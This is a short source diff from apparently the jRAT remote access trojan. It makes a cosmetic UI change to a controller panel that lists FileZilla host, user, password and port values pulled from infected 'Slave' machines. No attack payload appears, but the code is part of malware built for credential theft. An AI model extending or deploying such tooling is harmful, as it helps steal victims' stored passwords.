@@ -15,6 +15,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet68FileZillaPassword;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -56,7 +57,7 @@ public class PanelControlFileZilla extends PanelControlParent {
 		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 575, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblWillOnlyLoad))).addContainerGap(15, Short.MAX_VALUE)));
 		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 273, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear).addComponent(lblWillOnlyLoad)).addContainerGap(30, Short.MAX_VALUE)));
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Host", "User", "Pass", "Port" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(157);
 		table.getColumnModel().getColumn(1).setPreferredWidth(150);
